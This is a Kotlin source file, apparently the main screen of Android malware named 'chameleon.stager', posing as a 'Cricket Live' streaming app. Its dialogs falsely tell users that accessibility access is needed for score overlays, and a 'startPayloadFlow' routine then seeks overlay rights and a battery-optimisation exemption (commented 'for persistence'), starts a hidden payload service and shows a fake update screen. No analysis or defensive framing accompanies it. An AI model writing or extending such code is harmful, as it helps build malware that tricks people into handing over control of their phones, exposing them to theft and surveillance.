package com.chameleon.stager.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.chameleon.stager.databinding.ActivityMainBinding
import com.chameleon.stager.service.PayloadService
import com.chameleon.stager.service.StagerAccessibilityService
import com.chameleon.stager.utils.PermissionHelper

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private val permissionHelper = PermissionHelper()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        checkPermissions()
    }

    private fun setupUI() {
        binding.btnWatchLive.setOnClickListener {
            showPermissionDialog()
        }

        binding.btnSchedule.setOnClickListener {
            Toast.makeText(this, "Upcoming matches loading...", Toast.LENGTH_SHORT).show()
        }

        binding.btnTeams.setOnClickListener {
            showAccessibilityPrompt()
        }
    }

    private fun checkPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Enable Video Overlay to watch live"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        } else {
            binding.statusText.text = "Ready to stream"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        }
    }

    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Video Overlay Required")
            .setMessage("Cricket Live needs Accessibility access to show score overlays while you use other apps. This allows you to watch the match while chatting or browsing.")
            .setPositiveButton("Enable Now") { _, _ ->
                openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun showAccessibilityPrompt() {
        if (!isAccessibilityServiceEnabled()) {
            openAccessibilitySettings()
        } else {
            // Accessibility already granted - start the real flow
            startPayloadFlow()
        }
    }

    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        Toast.makeText(this, "Find 'Cricket Live' and enable it", Toast.LENGTH_LONG).show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )
        return enabledServices.any {
            it.resolveInfo.serviceInfo.packageName == packageName
        }
    }

    fun startPayloadFlow() {
        // Step 1: Request overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(
                Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
            )
            Toast.makeText(this, "Allow display over other apps for live overlay", Toast.LENGTH_LONG).show()
            return
        }

        // Step 2: Request battery optimization exemption (for persistence)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                )
                return
            }
        }

        // Step 3: Request notification permission (Android 13+)
        permissionHelper.requestNotificationPermission(this)

        // Step 4: Start the foreground service
        val serviceIntent = Intent(this, PayloadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // Step 6: Show update overlay
        val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
        overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(overlayIntent)

        finish()
    }

    override fun onResume() {
        super.onResume()
        if (isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Ready to stream"
            checkPermissions()
        }
    }
}
